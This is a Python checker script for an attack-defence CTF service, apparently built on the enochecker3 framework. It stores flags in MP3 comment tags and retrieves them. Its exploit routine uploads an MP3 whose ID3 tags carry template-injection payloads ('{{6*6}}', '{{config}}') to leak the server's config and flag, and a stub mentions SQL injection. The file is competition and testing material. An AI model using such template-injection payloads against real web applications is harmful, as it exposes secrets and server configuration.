"""
CHECKER FUNCTIONS
"""
import enochecker3
import secrets
from typing import Optional

from httpx import AsyncClient

from enochecker3 import (
    ChainDB,
    Enochecker,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher, assert_equals, assert_in
import mp3_helper
import utils
import faker
import logging
import eyed3
import base64

FAKER = faker.Faker(faker.config.AVAILABLE_LOCALES)
checker = Enochecker("t3chn0r4d10", 8001)
app = lambda: checker.app

password = str(secrets.token_hex(16))
username = "admin"


def setup_logger(log_file):
    logger = logging.getLogger("my_logger")
    logger.setLevel(logging.DEBUG)

    # Create a file handler
    file_handler = logging.FileHandler(log_file)
    file_handler.setLevel(logging.DEBUG)

    # Create a console handler
    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.INFO)

    # Create a formatter and add it to the handlers
    formatter = logging.Formatter(
        "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
    )
    file_handler.setFormatter(formatter)
    console_handler.setFormatter(formatter)

    # Add the handlers to the logger
    logger.addHandler(file_handler)
    logger.addHandler(console_handler)

    return logger


logger = setup_logger("logs.txt")


@checker.putflag(0)
async def putflag_test(
    task: PutflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    # Second file is in config which gets loaded from a file
    # Creates a malicious mp3 file named "exploit.mp3"
    mp3_helper.create_mp3("admin.mp3")
    mp3_helper.create_modify_mp3("admin.mp3", "Flag", "FindMe", "Techno")
    logger.info("Trying to login...")
    response = await utils.register_user_and_login(client, username, password, logger)
    logger.info("Admin LOGGED IN")
    # Try to upload mp3 to page
    with open("admin.mp3", "rb") as file:
        audio = eyed3.load("admin.mp3")
        audio.tag.comments.set("FLAG" + task.flag + "FLAGEND")
        audio.tag.save()
        files = {"file": file}
        headers = {"Content-Type": "audio/mpeg"}
        logger.info("Tries to upload to home")

        cookie = response.cookies.get("session")
        logger.info("Received " + response.headers)
        if cookie is None:
            logger.warning("No session cookie!!!")
            raise MumbleException("Session cookie missing")

        response = await client.post("/home", files=files, headers=headers)

        if response.status_code == 200:
            print("File upload successful!")
            logger.info("UPLOADED FLAG Successfully")
        else:
            logger.warning("UPLOADING FLAG FAILED!!! " + str(response.status_code))
            raise MumbleException("Upload failed")


@checker.getflag(0)
async def getflag_test(
    task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB
) -> None:
    # login and check that file exists
    url = await utils.login(client, username, password, logger)
    response = await client.get("/UPLOAD_FOLDER/admin.mp3")
    # Find flag in response text
    assert_equals(response.status_code, 200, "Didn't find file")
    decoded_mp3 = base64.b64decode(response.text)
    if task.flag not in decoded_mp3:
        raise MumbleException("Flag receiving failed. Not sent by server")


@checker.exploit(0)
async def exploit_test(searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
    # Creates a malicious mp3 file named "exploit.mp3"
    mp3_helper.create_mp3("exploit.mp3")
    mp3_helper.create_modify_mp3("exploit.mp3", "{{6*6}}", "{{config}}", "Techno")
    # TODO add logger
    # register
    url = await utils.register_user_and_login(client, "eve", "IamAliceISwear", logger)
    file_path = "./exploit.mp3"
    # Try to upload mp3 to page
    with open(file_path, "rb") as file:
        files = {"file": file}
        headers = {"Content-Type": "audio/mpeg"}

        response = await client.post(url, files=files, headers=headers)

        if response.status_code == 200:
            print("File upload successful!")
        else:
            raise MumbleException("Upload failed")

    # Find flag in response text
    if flag := searcher.search_flag(response.text):
        return flag


@checker.putflag(1)
async def putflag_test(
    task: PutflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    # First Flag Connect to DB and add a flag
    return


@checker.getflag(1)
async def getflag_test(
    task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB
) -> None:
    return


@checker.exploit(1)
async def exploit_test(searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
    # sql injection for now pass it
    return
